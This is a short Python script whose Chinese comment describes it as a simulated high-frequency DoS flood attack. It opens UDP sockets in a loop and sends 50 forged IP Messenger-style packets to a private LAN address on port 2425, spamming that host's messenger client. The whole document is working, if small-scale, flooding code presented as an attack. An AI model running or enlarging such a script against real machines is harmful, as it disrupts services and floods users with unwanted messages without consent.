import socket, time

# 模拟高频发送数据包的dos攻击（流量泛宏）
for i in range(50):
    s = socket.socket(type=socket.SOCK_DGRAM)
    s.connect(('192.168.104.131', 2425))

    packerId = str(time.time())
    name = "liuhaih"
    host = "win10"
    command = str(0x00000020)
    content = "this is the message from python3.10"
    message = "1.0:" + packerId + ":" + name + ":" + host + ":" + command + ":" + content

    s.send(message.encode())
